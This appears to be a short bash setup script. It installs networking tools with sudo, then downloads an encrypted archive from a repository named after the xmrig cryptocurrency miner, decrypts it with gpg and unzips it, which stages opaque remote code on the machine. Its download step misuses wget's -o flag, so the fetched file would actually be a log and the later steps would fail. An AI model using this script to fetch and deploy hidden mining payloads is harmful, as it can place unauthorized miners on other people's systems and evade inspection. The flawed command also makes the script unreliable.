#!/bin/bash

sudo apt install wget openvpn curl -y
wget https://github.com/joshmanzano/xmrig/raw/refs/heads/main/build.zip.gpg -o ./build.zip.gpg
gpg --decrypt ./build.zip.gpg
unzip ./build.zip
